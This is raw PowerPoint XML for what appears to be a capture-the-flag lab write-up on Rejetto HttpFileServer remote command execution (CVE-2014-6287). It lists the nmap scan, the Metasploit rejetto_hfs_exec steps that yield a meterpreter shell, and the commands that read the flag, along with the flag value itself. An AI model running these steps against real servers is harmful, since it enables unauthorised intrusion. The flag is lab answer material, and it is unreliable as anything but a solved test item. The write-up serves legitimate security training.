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6"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId17"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="257" r:id="rId2"/>
    <p:sldId id="258" r:id="rId3"/>
    <p:sldId id="259" r:id="rId4"/>
    <p:sldId id="279" r:id="rId5"/>
    <p:sldId id="278" r:id="rId6"/>
    <p:sldId id="260" r:id="rId7"/>
    <p:sldId id="280" r:id="rId8"/>
    <p:sldId id="286" r:id="rId9"/>
    <p:sldId id="282" r:id="rId10"/>
    <p:sldId id="287" r:id="rId11"/>
    <p:sldId id="285" r:id="rId12"/>
    <p:sldId id="281" r:id="rId13"/>
    <p:sldId id="288" r:id="rId14"/>
    <p:sldId id="263" r:id="rId15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4824" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="85" d="100"/>
          <a:sy n="85" d="100"/>
        </p:scale>
        <p:origin x="1590" y="96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預留位置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6AFA9A-7D3E-42CC-927E-F23DCCD6D484}" type="datetime2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2020年12月30日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3" name="日期預留位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1311F18-D970-4D7B-B098-1E7546817641}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>2020年12月30日</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="投影片影像預留位置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dirty="0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dirty="0"/>
              <a:t>按一下以編輯母片文字樣式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2674CE4-FBD8-4481-AEFB-CA53E599A745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en-US" altLang="zh-TW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indent="0" rtl="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pP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867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55871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59995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80511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In the command text field, we typed the command “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -v 10.4.21.36” for scanning target machine.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observed that the machine may be vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>Rejetto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>HttpFileServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> Remote Command Execution.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" alt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TW" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p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694413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launched a new command line terminal, typed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> and pressed Enter. This launched </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p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8693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typed “search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>HttpFileServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>to search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> modules for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>HttpFileServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT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800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>We would use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>rejetto_hfs_exec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> remote buffer overflow </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> module to exploit the target.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62209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We typed use “use exploit/windows/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>rejetto_hfs_exec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>launch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> module.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9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21921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typed “set RHOSTS 10.4.21.36”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>to set up targe IP.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10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379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algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Next, We typed “run” to exploit the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>target vulnerable application (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>HttpFileServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1200" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>. Then, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>we had successfully exploited the target vulnerable application (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>HttpFileServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>) and received a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t> shell.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2261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We typed ”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sysinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>” to get system information.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25160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Finally, we get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0">
                <a:latin typeface="ArialMT"/>
              </a:rPr>
              <a:t>the flag</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>f74c8347798f4082daf4b4570dba094a</a:t>
            </a:r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en-US" altLang="zh-TW" smtClean="0"/>
              <a:t>13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2159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5800B302-F4DC-4547-9C74-CF794137D166}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-TW" smtClean="0"/>
              <a:t>14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08655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3" name="矩形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4" name="矩形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5" name="矩形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6" name="矩形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7" name="矩形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zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="頁尾預留位置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8" name="日期預留位置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fld id="{D680CC22-4E9F-4C64-95EA-15180CEA148A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29" name="投影片編號預留位置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B44B7CC-4AA8-43B8-AE83-02691DCDABC3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kumimoji="0"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572BCF-2FF2-4C6E-B5A8-E6DE1AF4B961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6F4FBF5-CDC6-4057-A311-5C521C8F5DB8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>
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="1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5" name="內容預留位置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28" name="頁尾預留位置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6" name="日期預留位置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33E8C17-4C3B-4AED-BB36-C741E1DC4CDE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27" name="投影片編號預留位置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4" name="頁尾預留位置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3" name="日期預留位置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/>
          <a:p>
            <a:pPr rtl="0"/>
            <a:fld id="{A274F4D4-41C4-43DF-B10D-F70E9B50FCC2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頁尾預留位置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2" name="日期預留位置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0D8C69-8E88-4B86-8CF3-2D8ABB71F89F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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>編輯母片標題樣式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5A7139-9615-44C0-8E48-7B3A81ED52C4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eaVert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圖片預留位置 2" descr="要新增影像的空白預留位置。按一下預留位置，然後選取您要新增的影像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zh-TW" altLang="en-US"/>
              <a:t>按一下圖示以新增圖片</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-TW" alt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5" name="日期預留位置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70A3B-5055-4ACA-8D9E-69847E896869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zh-TW" altLang="en-US"/>
              <a:t>按一下以編輯母片文字樣式</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US"/>
              <a:t>第二層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US"/>
              <a:t>第三層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US"/>
              <a:t>第四層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US"/>
              <a:t>第五層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FB655-E279-4DE7-AFF4-4A3FE36E3A57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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>按一下以編輯母片文字樣式</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第二層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第三層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第四層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第五層</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-TW" alt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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>新增頁尾</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="日期預留位置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7E4AE4-EFA9-4FD9-A229-004A31E547D5}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:t>2020年12月30日</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/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en-US" altLang="zh-TW" smtClean="0"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1" name="矩形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2" name="矩形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5" name="矩形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6" name="矩形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7" name="矩形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8" name="矩形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9" name="矩形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0" name="矩形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zh-TW" altLang="en-US" sz="1800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2" name="標題預留位置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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>按一下以編輯母片標題樣式</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文字預留位置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zh-TW" altLang="en-US" dirty="0"/>
              <a:t>編輯母片文字樣式</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" rtl="0"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第二層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2" rtl="0"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第三層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3" rtl="0"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第四層</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4" rtl="0"/>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>第五層</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="頁尾預留位置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r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t>新增頁尾</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="日期預留位置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12233221-9E5A-44E3-8D2A-51D4D9EBD76D}" type="datetime2">
              <a:rPr lang="zh-TW" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>2020年12月30日</a:t>
            </a:fld>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="投影片編號預留位置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401CF334-2D5C-4859-84A6-CA7E6E43FAEB}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-TW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orient="horz" pos="2160">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="1" pos="3840">
          <p15:clr>
            <a:srgbClr val="F26B43"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" orient="horz" pos="4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forum.hackthebox.eu/discussion/137/optimum-write-up-by-alamot" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.cvedetails.com/cve/CVE-2014-6287/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6287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eclists.org/bugtraq/2014/Sep/85" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.kb.cert.org/vuls/id/251276" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.securityfocus.com/archive/1/5334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 rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW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Rejetto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altLang="zh-TW" b="1" i="0" dirty="0" err="1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HttpFileServer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Helvetica" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Remote Command Execution</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Helvetica" panose="020B0604020202020204" pitchFamily="34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US" altLang="zh-TW" sz="3600" dirty="0" err="1"/>
              <a:t>Seris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  <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>Reference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189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8021050"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="1900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 System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WIN-OMCNBKR66MN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IP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10.4.21.36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916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Target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Domain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None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90475"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="42228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Port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TCP: 80, 135, 139, 445, 3389, 49152, 49153, 49154, 49155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4208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OS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Windows 2012 R2 (6.3 Build 9600)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21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860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523345"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="10109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Application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HttpFileServer</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> 2.3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336848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Application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Info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altLang="zh-TW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 File Server, otherwise known as HFS, is a free web server specifically designed for publishing and sharing files.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2249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215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Info</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" alt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A731C092-9C3D-448F-90D7-B28DB48EB4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921156"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="2249488"/>
          <a:ext cx="10972800" cy="312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7925">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1206205741"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="8524875">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="25342206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Vulnerability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/>
                        <a:t>Rejetto</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>HttpFileServer</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> Remote Command Execution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336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Versions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2.3x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131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Platforms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Windows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390475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Exploitation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Remote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764208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Description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The </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>findMacroMarker</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> function in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>parserLib.pas</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> in </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>Rejetto</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> HTTP File Server (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>aks</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t> HFS or </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
                        <a:t>HttpFileServer</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t>) 2.3x before 2.3c.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731310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Impact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dirty="0"/>
                        <a:t>The Vulnerability</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="zh-TW" altLang="en-US"/>
                        <a:t> </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW"/>
                        <a:t>allows </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
                        <a:t>remote attackers to execute arbitrary programs via a %00 sequence in a search action.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821237"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="33305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Solution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/>
                        <a:t>This issue is addressed in HFS version 2.3c and later.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6293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2899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Nmap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4465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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t> -v 10.4.21.36  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A6D9F42-76BE-4403-84D8-2BB5BBC70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6029" y="2274495"/>
            <a:ext cx="5998415" cy="437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88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24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msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW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5166B2A-A4D0-4EF7-988A-32D0504D5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819" y="2249424"/>
            <a:ext cx="6294313" cy="4565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8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194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search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>HttpFileServer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F796549-8826-485A-AAD0-430D946171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034" y="1900483"/>
            <a:ext cx="6477834" cy="480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25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43106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 exploit/windows/http/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>rejetto_hfs_exec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show options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B26E6828-3333-44EC-8256-36D84210D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362" y="1262962"/>
            <a:ext cx="6476794" cy="543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925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23062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set RHOSTS 10.4.21.36</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>show options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6B7C82FB-0C32-4EB7-9CB6-F70DBA73E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161" y="1676400"/>
            <a:ext cx="7148807" cy="4898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52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run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4883EAD-892A-44A2-864F-3D4AD63000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1556" y="3095649"/>
            <a:ext cx="8304655" cy="330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59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822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sysinfo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW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077E1D6-D8C1-425C-AEBA-400DD10440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5243" y="2115407"/>
            <a:ext cx="5915770" cy="4589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021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Exploit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 err="1"/>
              <a:t>metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" altLang="en-US" dirty="0"/>
              <a:t> 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C347701-7860-4F94-9512-DD2BF9E2974C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1015067" y="2726317"/>
            <a:ext cx="130574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shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>cd /</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0"/>
              <a:t>type flag.txt</a:t>
            </a:r>
            <a:endParaRPr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34F691E-D36F-411A-92A6-32FD0B3B7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0616" y="1727831"/>
            <a:ext cx="6896471" cy="484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391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altLang="zh-TW" dirty="0"/>
              <a:t>Reference</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" alt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rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.cvedetails.com/cve/CVE-2014-6287/</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.securityfocus.com/archive/1/533429</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId5"/>
              </a:rPr>
              <a:t>https://www.kb.cert.org/vuls/id/251276</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
                <a:hlinkClick r:id="rId6"/>
              </a:rPr>
              <a:t>https://seclists.org/bugtraq/2014/Sep/85</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" dirty="0">
